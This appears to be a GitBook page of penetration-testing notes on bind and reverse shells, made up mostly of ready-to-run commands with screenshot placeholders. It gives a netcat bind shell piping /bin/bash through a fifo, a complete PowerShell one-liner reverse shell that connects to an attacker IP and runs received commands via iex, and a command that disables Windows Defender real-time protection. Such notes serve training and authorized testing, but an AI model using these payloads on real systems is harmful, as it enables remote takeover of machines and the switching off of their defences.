# Shells & Payloads

## Bind Shells

<figure><img src="../.gitbook/assets/image (37).png" alt=""><figcaption><p>With a bind shell, the <code>target</code> system has a listener started and awaits a connection from a pentester's system (attack box).</p></figcaption></figure>

## Basic Bind Shell with Netcat

### **Server - Binding a Bash shell to the TCP session**

{% code overflow="wrap" %}
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

### **Client - Connecting to bind shell on target**

{% code overflow="wrap" %}
```
nc -nv 10.129.41.200 7777
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

## Reverse Shells

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption><p>With a reverse shell, the attack box will have a listener running, and the target will need to initiate the connection.</p></figcaption></figure>

## Simple Reverse Shell in Windows

### Server (attack box)

{% code overflow="wrap" %}
```
sudo nc -lvnp 443
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

### **Client (target)**

{% code overflow="wrap" %}
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (43).png" alt=""><figcaption><p> <code>Windows Defender antivirus</code> (<code>AV</code>) software stopped the execution of the code. </p></figcaption></figure>

### **Disable AV**

{% code overflow="wrap" %}
```
Set-MpPreference -DisableRealtimeMonitoring $true
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (44).png" alt=""><figcaption><p>To disable the antivirus through the <code>Virus &#x26; threat protection settings</code> or by using this command in an administrative PowerShell console. Once AV is disabled, attempt to execute the code again.</p></figcaption></figure>
